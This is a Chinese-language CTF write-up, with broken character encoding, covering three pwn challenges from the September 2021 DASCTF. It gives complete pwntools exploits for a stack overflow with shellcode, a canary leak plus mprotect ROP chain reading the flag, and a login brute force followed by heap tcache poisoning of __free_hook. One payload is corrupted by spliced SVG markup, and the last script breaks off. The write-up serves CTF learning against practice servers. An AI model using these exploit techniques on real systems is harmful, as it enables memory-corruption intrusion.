    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªæ¯”èµ›å…¶å®æ˜¯æ²¡æŠ±ç€å¾ˆè®¤çœŸçš„æ€åº¦å»æ‰“çš„ï¼Œå¯èƒ½ç”±äºä¸€è´¯çš„å°è±¡ï¼Œä¸‹æ„è¯†è§‰å¾—å®‰æ’æœˆèµ›ï¼Œä¸æ˜¯æˆ‘è¿™ç§å°èœé¸¡èƒ½çœ‹çš„ï¼Œæ¯•ç«Ÿä»å»å¹´å¹´å°¾å­¦åˆ°ç°åœ¨ï¼Œè¿™ç§æ¯”èµ›æˆ‘éƒ½æ˜¯æ¥å‡‘äººå¤´çš„ã€‚ä½†æ˜¯è¿™æ¬¡ï¼Œå¯æƒœäº†ï¼Œåé¢çœ‹äº†ä¸‹å¸ˆå‚…çš„wpï¼Œå‘ç°ï¼Œç«Ÿç„¶ä¸éš¾ï¼Œæ‰€ä»¥å‡ºç¯‡åšå®¢å¤ç°ä¸€ä¸‹å§ï¼Œè¿™æ˜¯åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå”¯ä¸€å…¨éƒ¨pwné¢˜éƒ½æ˜¯æˆ‘èƒ½åšçš„äº†ï¼Œä¹Ÿè®¸ï¼Œè¿™å°±æ˜¯è¿›æ­¥äº†å§ï¼Œå²æœˆæ¼«é•¿ï¼Œå€¼å¾—æœŸå¾…ï¼</p>
<p>æ¥æºï¼š<a href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p>
<h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png" alt="image-20210928152753508"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨æ²¡å¼€ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯æ‰§è¡Œshellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png" alt="image-20210928152907622"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png" alt="image-20210928152921816"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png" alt="image-20210928152851336"></p>
<p>é¦–å…ˆï¼Œä¼šæœ‰ä¸ªè¾“å…¥ç‚¹ï¼Œå¹¶ä¸”è¿˜ä¼šæ‰“å°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥æ»¡0x20ä¸ªå­—ç¬¦ï¼Œå°±ä¼šè¿ç€rbpä¸€èµ·æ³„éœ²å‡ºæ¥ï¼Œè·å–åˆ°æ ˆä¸Šåœ°å€ï¼Œåé¢è¿˜è´´å¿ƒçš„ç»™äº†æ ˆæº¢å‡ºã€‚</p>
<p>é‚£å°±æ˜ç¡®äº†ï¼šæ ˆä¸Šå†™å…¥shellcodeï¼Œå€Ÿç”¨å¾—åˆ°æ¥çš„æ ˆä¸Šåœ°å€ç®—å‡ºshellcodeå†™å…¥çš„åœ°å€ï¼Œå°†è¿™ä¸ªåœ°å€å¡«å……åˆ°è¿”å›åœ°å€å»ï¼Œç„¶åæ‰§è¡Œshellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png" alt="image-20210928153222539"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png" alt="image-20210928145300688"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ï¼Œæ²¡å¼€PIEï¼ŒRELROä¹Ÿæ²¡å¼€å…¨</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png" alt="image-20210928145345926"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png" alt="image-20210928145402864"></p>
<p>ç¨‹åºä¹Ÿååˆ†ç®€å•ï¼Œä½†æ˜¯å¼€äº†æ²™ç®±ï¼Œæ‰€ä»¥æ˜¯orwã€‚ç»™äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ³„éœ²canaryçš„ï¼Œä»¥åŠä¸€ä¸ªæ˜æ˜¾æ ˆæº¢å‡ºã€‚</p>
<p>æ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®çš„ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡ºcanaryï¼Œå…¶å®ç”±äºé•¿åº¦å¤Ÿï¼Œè¿˜èƒ½å†å¤šæ³„éœ²ä¸€ä¸ªå¯„å­˜å™¨æˆ–è€…æ ˆä¸Šå­˜å‚¨çš„å‡½æ•°åœ°å€ï¼Œä»è€Œè·å–libcåœ°å€ï¼Œç„¶åå‘¢ï¼Œè¿™è¾¹æ³„éœ²çš„é€‰æ‹©å¯„å­˜å™¨ä¸Šçš„æ²¡é—®é¢˜ï¼Œåˆšå¼€å§‹æˆ‘æ˜¯é€‰æ‹©æ ˆä¸Šçš„stdinï¼Œç„¶åå‘ç°è¿œç¨‹è¿™ä¸ªæ‰“å°å‡ºæ¥æ˜¯ç©ºçš„</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png" alt="image-20210928152412946"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png" alt="image-20210928152432248"></p>
<p>æ¢æˆå¯„å­˜å™¨ä¸Šçš„libcåœ°å€å°±è¡Œäº†ã€‚æ‹¥æœ‰äº†libcå’Œcanaryåå°±å¯ä»¥ç€æ‰‹å¸ƒç½®ropäº†ï¼Œæˆ‘çš„åšæ³•æ˜¯ä½¿ç”¨mprotectä¿®æ”¹æƒé™ç„¶åè·³è½¬åˆ°readå‡½æ•°è¿›è¡Œå†™å…¥shellcodeï¼Œæœ€åè·³è½¬shellcodeæ‰§è¡Œè¯»å–flagã€‚å¸ˆå‚…çš„åšæ³•å°±æ˜¯ç›´æ¥ç”¨ropè¿›è¡Œopenï¼Œreadï¼Œwriteçš„è°ƒç”¨è¯»å–flag</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png" alt="image-20210928152051899"></p>
<p>è¿™é¢˜æœ‰ç‚¹å‘ï¼Œçœ‹äº†å¸ˆå‚…çš„wpä¹ŸçŸ¥é“äº†ï¼Œç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå®˜æ–¹ç»™çš„é™„ä»¶é‡Œçš„libcç‰ˆæœ¬æ˜¯è·Ÿè¿œç¨‹é¶æœºå·®äº†ä¸€ä¸ªå°ç‰ˆæœ¬çš„ï¼ŒæŠŠlibcæ¢æˆ2.23-0ubuntu11.3å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">p%27</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
</g>
</svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png" alt="image-20210928153319183"></p>
<p>checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p>è¿™é¢˜æ˜¯ä¸‰é¢˜é‡Œé¢æœ€å¤æ‚çš„ä¸€é¢˜ï¼Œå› ä¸ºåœ¨è¿›å…¥çœŸæ­£çš„ç¨‹åºå‰ï¼Œæœ‰ä¸€ä¸ªç™»é™†ç¨‹åºï¼Œæ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦èŠ±æ—¶é—´è¿›è¡Œå®¡è®¡</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png" alt="image-20210928154615068"></p>
<p>å¼€äº†æ²™ç®±</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png" alt="image-20210928162959918"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png" alt="image-20210928163032723"></p>
<p>ä¸€è¿›å…¥ï¼Œè¦å…ˆè¾“å…¥è´¦å·å’Œå¯†ç é€šè¿‡éªŒè¯ï¼ŒéªŒè¯é€šè¿‡æ‰èƒ½è¿›å…¥çœŸæ­£çš„æœ‰æ¼æ´çš„ç¨‹åºã€‚è´¦å·å·²ç»ç»™ï¼šadminï¼›å¯†ç è¦è‡ªå·±å»æ‰¾</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png" alt="image-20210928165344870"></p>
<p>æˆ‘å…ˆæ–­ç‚¹æ–­åœ¨æ¯”è¾ƒå‡½æ•°é‚£ï¼Œçœ‹çœ‹æœ€ç»ˆæ¯”è¾ƒçš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼ˆåŸæœ¬è¾“å…¥çš„æ˜¯å…«ä¸ªaï¼‰ï¼Œç¬¬äºŒä¸ªå°±æ˜¯è¦æ¯”è¾ƒçš„å¯†ç ã€‚ç„¶åæˆ‘æŠŠä¸‹ä¸€æ¬¡è¾“å…¥çš„å€¼æ¢æˆè¿™ä¸ªå¯†ç </p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png" alt="image-20210928165946197"></p>
<p>å‘ç°ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å˜æˆäº†0ï¼Œé‚£ä¸æ˜¯æˆªæ–­äº†å—ï¼Ÿä½†æ˜¯å¹¶æ²¡æœ‰é€šè¿‡éªŒè¯ï¼Œç„¶åæˆ‘å»cä»£ç æ•²äº†ä¸‹ï¼ŒåŸæ¥æ˜¯è¦ä¸¤ä¸ªå­—ç¬¦ä¸²åŒæ—¶éƒ½æ˜¯â€™\x00â€™æ‰ä¼šé€šè¿‡æ¯”è¾ƒï¼Œä¸€ä¸ªæ˜¯ä¸è¡Œçš„~</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png" alt="image-20210928170846837"></p>
<p>ç„¶ååˆè¯•äº†ä¸€äº›éšä¾¿è¾“å…¥çš„å¯†ç ï¼ŒæƒŠè®¶çš„å‘ç°ï¼Œå¾—åˆ°çš„éªŒè¯å¯†ç ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰å¤åˆ¶çš„å¯†ç é‚£æ¬¡ä¼šå‡ºç°0ï¼Œçœ‹äº†ä¸‹wpï¼Œå¤§ä½¬æ¨æµ‹æ˜¯ä½æ•°çš„é—®é¢˜ï¼Œåªæœ‰32ä½çš„æ•°å­—æ‰èƒ½è®©å¯†ç ä¸º0ï¼Œæˆ‘è¯•äº†ä¸‹ç¡®å®æ˜¯è¿™æ ·çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªå¯ä»¥ä¹Ÿè®©æˆ‘ä»¬è¾“å…¥çš„å¯†ç è¢«åŠ å¯†æˆé¦–ä½æ˜¯â€™\x00â€™å°±å¯ä»¥é€šè¿‡éªŒè¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¤§ä½¬çš„çˆ†ç ´è„šæœ¬ï¼Œæœ€ç»ˆè·å¾—ä¸¤ä¸ªå¯ä»¥é€šè¿‡çš„å€¼ï¼šâ€™câ€™å’Œâ€™\xecâ€™ã€‚ç„¶åå¤§ä½¬æ˜¯ç”¨IDAè°ƒè¯•çš„ï¼Œæˆ‘ä»¥å‰æœ‰å°è¯•è¿‡ï¼Œä½†æ˜¯æ— å¥ˆä¸€ç›´æŠ¥é”™ï¼Œä½†æ˜¯gdbè°ƒè¯•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ²¡å·®</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png" alt="image-20210928171601841"></p>
<p>è¿›å…¥ä¸‹ä¸€ä¸ªç¨‹åºäº†</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png" alt="image-20210928190830374"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png" alt="image-20210928190852013"></p>
<p>è¿™è¾¹v3è¿”å›å€¼å› ä¸º%sçš„ç¼˜æ•…ä¼šæŠŠbyte_50A0æŒ‡å‘çš„å­—ç¬¦å…¨éƒ¨ä½œä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ï¼Œè€Œbyte_50A0å¯ä»¥æŸ¥çœ‹ï¼Œå…¨éƒ½æ˜¯aï¼Œä¼¼ä¹æœ‰0x508ä¸ªï¼Œæ‰€ä»¥è¿™è¾¹åœ¨addå†™å…¥çš„å†…å®¹æ˜¯æº¢å‡ºçš„ã€‚</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png" alt="image-20210928193027743"></p>
<p>ä¸‡äº‹å…ˆæ³„éœ²libcï¼Œè¿™è¾¹è¦å…ˆç”³è¯·å†é‡Šæ”¾ä¸€ä¸ª0x410çš„å †å—ï¼Œé˜²æ­¢è¿›å…¥tcache binä¸­ï¼Œç„¶åå†ç”³è¯·çš„å¾—æ˜¯0x8å¤§å°çš„å †å—ï¼Œå› ä¸ºsnprinfä¼šæ‰“å°ä¸ªæ•°è¿›å»ï¼Œä¸èƒ½è¶…è¿‡å…«ä¸ªï¼Œå¦åˆ™ä¼šæŠŠä¸Šé¢æ®‹ç•™çš„bkæŒ‡é’ˆç ´åï¼Œä»è€Œå¯ä»¥æ³„éœ²å‡ºlibcåœ°å€</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png" alt="image-20210928193842290"></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png" alt="image-20210928194236357"></p>
<p>ç„¶åå†ååºé‡Šæ”¾ä¸‰ä¸ªå †å—ï¼Œç”³è¯·å›æ¥ï¼Œå°±ä¼šè®©ä¸Šé¢çš„å †å—æ˜¯æœ€å…ˆè¢«ç”³è¯·çš„ï¼Œç„¶åé€šè¿‡æº¢å‡ºæŠŠå †å—åˆ†é…åˆ°0x23330000å†™å…¥shellcodeï¼Œä¹‹å‰å†æ¥ä¸€éæŠŠfdæŒ‡é’ˆä¸ºfree_hookï¼Œç”³è¯·è¿‡å»æ”¹ä¸ºshellcodeåœ°å€ï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªå †å—å°±ä¼šè·³è½¬æ‰§è¡Œshellcodeäº†</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png" alt="image-20210928200129108"></p>
<p>æˆåŠŸï¼</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png" alt="image-20210928203049261"></p>
<p>ä¸å®¹æ˜“ï¼Œæœ‰æœä¸€æ—¥æˆ‘è¿™å°èœé¸¡ç«Ÿç„¶èƒ½èµ›åâ€œakâ€ï¼Œæ³ªç›®ï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	mov rdi, 0x23330000</span><br><span class="hljs-string">	xor rsi, rsi</span><br><span class="hljs-string">	mov rax, 2</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string">	</span><br><span class="hljs-string">	mov rdi, rax</span><br><span class="hljs-string">	mov rsi, rsp</span><br><span class="hljs-string">	mov rdx, 0x50</span><br><span class="hljs-string">	xor rax, rax</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 1</span><br><span class="hljs-string">	mov rax, 1</span><br><span class="hljs-string">	syscall	</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>)<br>add(<span 